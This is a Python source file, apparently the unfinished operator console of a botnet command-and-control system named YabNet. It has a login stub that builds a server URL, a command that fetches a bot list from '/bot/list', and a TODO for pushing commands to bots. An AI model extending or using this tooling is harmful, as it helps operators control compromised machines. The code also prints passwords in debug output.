#!/usr/bin/env python
"""A simple cmd2 application."""
import argparse
import requests
import socket 
import os 
import platform 

import cmd2
from cmd2 import ansi

REGISTERKEY = "registerkey"
MASTERKEY = "masterkey"
#URL = 'http://localhost:5000'

class CmdLineApp(cmd2.Cmd):

    CUSTOM_CATEGORY = 'My Custom Commands'

    def __init__(self):
        super().__init__(use_ipython=True)

        banner = r"""

__   __    _     _   _      _                                       
\ \ / /   | |   | \ | |    | |                                      
 \ V /__ _| |__ |  \| | ___| |_                                     
  \ // _` | '_ \| . ` |/ _ \ __|                                    
  | | (_| | |_) | |\  |  __/ |_                                     
  \_/\__,_|_.__/\_| \_/\___|\__|                                    
                                                                    
                                                                    
___  ___          _              _____                       _      
|  \/  |         | |            /  __ \                     | |     
| .  . | __ _ ___| |_ ___ _ __  | /  \/ ___  _ __  ___  ___ | | ___ 
| |\/| |/ _` / __| __/ _ \ '__| | |    / _ \| '_ \/ __|/ _ \| |/ _ \
| |  | | (_| \__ \ ||  __/ |    | \__/\ (_) | | | \__ \ (_) | |  __/
\_|  |_/\__,_|___/\__\___|_|     \____/\___/|_| |_|___/\___/|_|\___|
                                                                    
                                                                    

        """
        self.intro = ansi.style(banner, fg='red', bold=True) 

        # Allow access to your application in py and ipy via self
        self.locals_in_py = True

        # Set the default category name
        self.default_category = 'cmd2 Built-in Commands'

        # Should ANSI color output be allowed
        self.allow_ansi = ansi.ANSI_TERMINAL

    def get_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('10.255.255.255', 1))
            IP = s.getsockname()[0]
        except:
            IP = '127.0.0.1'
        finally:
            s.close()

            return IP 
 
    """
    speak_parser = argparse.ArgumentParser()
    speak_parser.add_argument('-p', '--piglatin', action='store_true', help='atinLay')
    speak_parser.add_argument('-s', '--shout', action='store_true', help='N00B EMULATION MODE')
    speak_parser.add_argument('-r', '--repeat', type=int, help='output [n] times')
    speak_parser.add_argument('-f', '--fg', choices=ansi.FG_COLORS, help='foreground color to apply to output')
    speak_parser.add_argument('-b', '--bg', choices=ansi.BG_COLORS, help='background color to apply to output')
    speak_parser.add_argument('-l', '--bold', action='store_true', help='bold the output')
    speak_parser.add_argument('-u', '--underline', action='store_true', help='underline the output')
    speak_parser.add_argument('words', nargs='+', help='words to say')

    @cmd2.with_argparser(speak_parser)
    def do_speak(self, args):
        words = []
        for word in args.words:
            if args.piglatin:
                word = '%s%say' % (word[1:], word[0])
            if args.shout:
                word = word.upper()
            words.append(word)

        repetitions = args.repeat or 1
        output_str = ansi.style(' '.join(words), fg=args.fg, bg=args.bg, bold=args.bold, underline=args.underline)

        for i in range(min(repetitions, self.maxrepeats)):
            # .poutput handles newlines, and accommodates output redirection too
            self.poutput(output_str)
    """

    login_parser = argparse.ArgumentParser()
    login_parser.add_argument('-r', '--remote', type=str, help='Remote rabnet server host to login to. <ip>:<port>')
    login_parser.add_argument('-u', '--username', type=str, help='Username to login with')
    login_parser.add_argument('-p', '--password', type=str, help='Password to login with')

    @cmd2.with_category(CUSTOM_CATEGORY)
    @cmd2.with_argparser(login_parser)
    def do_login(self, args):
        """
        TODO: Implement User Model and /login endpoint in the server 
        """
        remoteserver = args.remote 
        username = args.username 
        password = args.password 

        # TODO: Update the URL to have custom port numbers as well 
        global URL 
        URL = 'http://' + remoteserver + ":5000"

        output_host = ansi.style('[DEBUG] ' + remoteserver, fg='red', bold=True)
        output_username = ansi.style('[DEBUG] ' + username, fg='red', bold=True)
        output_password = ansi.style('[DEBUG] ' + password, fg='red', bold=True)

        self.poutput(output_host)
        self.poutput(output_username)
        self.poutput(output_password)


    # TBH the result from the server should be in json format, and this CLI should 
    # parse the JSON and pretty print. 
    @cmd2.with_category(CUSTOM_CATEGORY)
    #@cmd2.with_argparser()
    def do_list(self, arg):
        try:
            if URL is None:
                self.poutput('URL is not set!')
        except Exception as e:
            output_loginfirst = ansi.style("\n\n!!! Login First !!!\n", fg='red', bg='blue', bold=True)
            self.poutput(output_loginfirst)


        url = URL + '/bot/list'
        res = requests.get(url)

        botlist = "===================================\n"
        botlist += res.text

        output_botlist = ansi.style(botlist, fg='green', bold=True)

        self.poutput(output_botlist)

    @cmd2.with_category(CUSTOM_CATEGORY)
    def do_exit(self, arg):
        self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
        return True

    @cmd2.with_category(CUSTOM_CATEGORY)
    def do_quit(self, arg):
        self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
        return True
        

    #TODO: Implement bot command push and returning the result 
    #push_parser = argparse.ArgumentParser()
    #push_parser.add_argument('-t', '--target', type=str, help='')





if __name__ == '__main__':
    import sys
    c = CmdLineApp()
    sys.exit(c.cmdloop())